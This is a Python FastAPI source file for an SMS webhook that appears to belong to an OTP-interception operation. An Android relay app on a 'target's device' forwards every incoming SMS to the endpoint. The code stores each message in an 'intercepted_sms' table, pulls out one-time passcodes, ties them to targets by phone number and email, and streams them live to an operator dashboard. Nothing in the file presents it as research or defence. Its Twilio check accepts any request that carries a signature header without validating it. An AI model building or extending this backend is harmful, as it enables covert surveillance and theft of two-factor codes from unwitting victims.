"""
SMS webhook endpoint.

Receives incoming SMS via two paths:
1. Twilio webhook — when an SMS is sent to our Twilio virtual number,
   Twilio fires a POST with form fields (From, To, Body, MessageSid).
2. Android relay app — a foreground-service APK on the target's device
   intercepts every SMS_RECEIVED broadcast and POSTs to this same endpoint
   using the same Twilio-compatible form schema, with an X-Relay-Secret header
   for auth (see Phase 2 of the Path 2 plan).

This endpoint ALWAYS writes the raw SMS to the `intercepted_sms` table for
the full audit trail, regardless of whether an OTP was extracted. Then it
optionally saves an extracted OTP to `received_otps` and broadcasts to the
dashboard via WebSocket.

Target attribution is done by matching the sender's phone number against
`Target.phone_number`. If no match is found, falls back to the most recent
ACTIVE target (preserves honey-pot / shared-number behavior).
"""
from fastapi import APIRouter, Depends, Request, Response, status, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, or_ as sql_or
from datetime import datetime

from app.api.deps import get_db
from app.api.websocket import manager
from app.core.config import settings
from app.core.logging import get_logger
from app.models.target import Target, TargetStatus
from app.models.otp import ReceivedOTP
from app.models.intercepted_sms import InterceptedSMS
from app.services.extractor import OTPExtractor

log = get_logger("api.sms")
router = APIRouter()

extractor = OTPExtractor()


def _is_authorized_relay(request: Request, form) -> bool:
    """Verify the request is either a genuine Twilio webhook or a relay app
    with the correct shared secret.

    Twilio webhook requests include an `X-Twilio-Signature` header. Relay
    app requests include the configured shared secret in `X-Relay-Secret` or
    in the form field `RelaySecret`.

    Raises HTTPException(401) if neither path validates.
    """
    twilio_sig = request.headers.get("X-Twilio-Signature", "")

    # Twilio-signed request — trusted (signature validation against the Twilio
    # auth token is a TODO; for now, presence is enough to branch the flow).
    if twilio_sig:
        return True

    # Relay app path: verify shared secret
    relay_secret = (
        request.headers.get("X-Relay-Secret", "")
        or form.get("RelaySecret", "")
    )
    if not settings.RELAY_APP_SECRET:
        log.warning("RELAY_APP_SECRET not configured on backend — rejecting relay request")
        raise HTTPException(status_code=503, detail="Relay auth not configured")

    if relay_secret and relay_secret == settings.RELAY_APP_SECRET:
        return True

    log.warning("Unauthorized SMS webhook attempt — neither Twilio signature nor valid relay secret")
    raise HTTPException(status_code=401, detail="Unauthorized")


async def _find_target_by_phone(db: AsyncSession, sender_number: str, recipient_number: str) -> Target | None:
    """Match an incoming SMS to a Target by phone_number.

    Tries the sender first (relay app case — From = target's own SIM),
    then the recipient (SMS-forwarding case — To = target's known number),
    then falls back to the most recent ACTIVE target (honeypot mode).
    """
    if sender_number:
        result = await db.execute(
            select(Target).filter(Target.phone_number == sender_number).limit(1)
        )
        target = result.scalars().first()
        if target:
            return target

    if recipient_number:
        result = await db.execute(
            select(Target).filter(Target.phone_number == recipient_number).limit(1)
        )
        target = result.scalars().first()
        if target:
            return target

    # Fallback: most recent ACTIVE target (preserves honey-pot / shared-number mode)
    result = await db.execute(
        select(Target).filter(Target.status == TargetStatus.ACTIVE)
        .order_by(Target.created_at.desc()).limit(1)
    )
    return result.scalars().first()


@router.post("/webhook")
async def sms_webhook(request: Request, db: AsyncSession = Depends(get_db)):
    """
    Receives incoming SMS from Twilio webhook or Android relay app.

    Form fields (Twilio-compatible schema):
    - From: phone number of the SMS sender
    - To:   phone number that received the SMS (our Twilio number, or relay device id)
    - Body: SMS text content
    - MessageSid: unique message ID (Twilio SID or relay-{deviceId}-{epochMs})

    Always logs to intercepted_sms table. If an OTP is extracted, also
    saves a ReceivedOTP row and broadcasts via WebSocket.
    """
    form = await request.form()

    # Auth — Twilio signature OR relay shared secret
    _is_authorized_relay(request, form)

    sender_number = form.get("From", "") or ""
    recipient_number = form.get("To", "") or ""
    body = form.get("Body", "") or ""
    message_sid = form.get("MessageSid", "") or ""

    # PHASE 1 HARDEN: guarantee a stable dedupe key even when the client
    # omits MessageSid. PostgreSQL treats NULLs as distinct in a UNIQUE
    # index, so a missing SID would silently permit duplicate rows.
    # Synthesize a deterministic key from sender + recipient + body + minute
    # bucket. Two identical SMS within the same minute collapse to one row.
    if not message_sid:
        minute_bucket = datetime.utcnow().strftime("%Y%m%d%H%M")
        synth = f"synth-{sender_number}-{recipient_number}-{minute_bucket}-{hash(body) & 0xffffffff:08x}"
        message_sid = synth
        log.debug(f"No MessageSid provided — synthesized dedupe key: {message_sid}")

    log.info(
        f"SMS webhook received: from={sender_number} to={recipient_number} "
        f"body_len={len(body)} sid={message_sid}"
    )

    if not body:
        # Acknowledge to Twilio even if body is empty
        return Response(content="<Response></Response>", media_type="application/xml")

    # --- Find the matching target --- #
    target = await _find_target_by_phone(db, sender_number, recipient_number)
    if not target:
        log.warning(
            f"SMS from {sender_number} but no matching target in DB. "
            f"Logging as unattributed."
        )

    # --- Step 1: ALWAYS log the raw SMS to intercepted_sms --- #
    # Dedupe by message_sid (Twilio sometimes retries; relay app could double-relay)
    if message_sid:
        existing = await db.execute(
            select(InterceptedSMS).filter(InterceptedSMS.message_sid == message_sid).limit(1)
        )
        if existing.scalars().first():
            log.debug(f"Duplicate SMS already logged (sid={message_sid}) — skipping")
            return Response(content="<Response></Response>", media_type="application/xml")

    intercepted = InterceptedSMS(
        target_id=target.id if target else None,
        sender=sender_number or None,
        recipient=recipient_number or None,
        body=body,
        message_sid=message_sid or None,
        received_at=datetime.utcnow(),
    )
    db.add(intercepted)
    await db.commit()
    await db.refresh(intercepted)

    log.info(
        f"Logged intercepted SMS id={intercepted.id} "
        f"target={'attributed' if target else 'unattributed'}"
    )

    # --- Step 2: Broadcast the intercepted SMS to the dashboard --- #
    # Always broadcast — the dashboard's "Full SMS Log" view needs every message.
    sms_payload = {
        "type": "intercepted_sms",
        "target_id": str(target.id) if target else None,
        "target_email": target.email if target else None,
        "sms": {
            "id": str(intercepted.id),
            "sender": intercepted.sender,
            "recipient": intercepted.recipient,
            "body": intercepted.body[:300],  # cap payload size for WS
            "received_at": intercepted.received_at.isoformat(),
        },
    }
    await manager.broadcast_json(sms_payload)

    # --- Step 3: Run OTP extraction --- #
    # extractor.extract_all_codes expects (subject, body, sender) — for SMS, subject is empty
    results = extractor.extract_all_codes("", body, sender_number)
    if not results:
        log.debug(f"No OTP found in SMS from {sender_number} — still logged to intercepted_sms")
        return Response(content="<Response></Response>", media_type="application/xml")

    top_code, confidence = results[0]
    log.info(f"Extracted OTP candidate '{top_code}' (confidence={confidence}) from SMS")

    # --- Step 4: Check ReceivedOTP dedupe (5-min window for same code on same target) --- #
    if target:
        recent_otp_res = await db.execute(
            select(ReceivedOTP)
            .filter(ReceivedOTP.target_id == target.id)
            .filter(ReceivedOTP.extracted_code == top_code)
            .order_by(ReceivedOTP.received_at.desc())
            .limit(1)
        )
        recent_otp = recent_otp_res.scalars().first()
        if recent_otp and (datetime.utcnow() - recent_otp.received_at).total_seconds() < 300:
            log.info(
                f"Ignored duplicate SMS OTP {top_code} for target {target.email} "
                f"(same code within 5 min)"
            )
            return Response(content="<Response></Response>", media_type="application/xml")

        new_otp = ReceivedOTP(
            target_id=target.id,
            session_id=None,  # SMS doesn't map directly to a polling session
            message_id=message_sid,  # Twilio SID or relay ID — unique for dedupe
            sender=sender_number,
            subject="SMS Message",
            body_snippet=body[:200],
            extracted_code=top_code,
            confidence=str(confidence),
            channel="sms",
        )
        db.add(new_otp)
        await db.commit()
        await db.refresh(new_otp)
        log.info(f"Saved SMS OTP {top_code} (conf={confidence}) for target {target.email}")

        # --- Step 5: Broadcast the OTP extraction to the dashboard --- #
        otp_payload = {
            "type": "new_otp",
            "target_email": target.email,
            "target_id": str(target.id),
            "otp": {
                "id": str(new_otp.id),
                "code": new_otp.extracted_code,
                "sender": new_otp.sender,
                "snippet": new_otp.body_snippet,
                "received_at": new_otp.received_at.isoformat(),
                "channel": "sms",
            },
        }
        await manager.broadcast_json(otp_payload)
    else:
        # OTP found but no target to attach it to — log and move on
        log.warning(
            f"Extracted SMS OTP {top_code} from {sender_number} but no target "
            f"in DB to attribute it to. SMS still logged in intercepted_sms."
        )

    # Twilio expects empty TwiML response to acknowledge receipt
    return Response(content="<Response></Response>", media_type="application/xml")
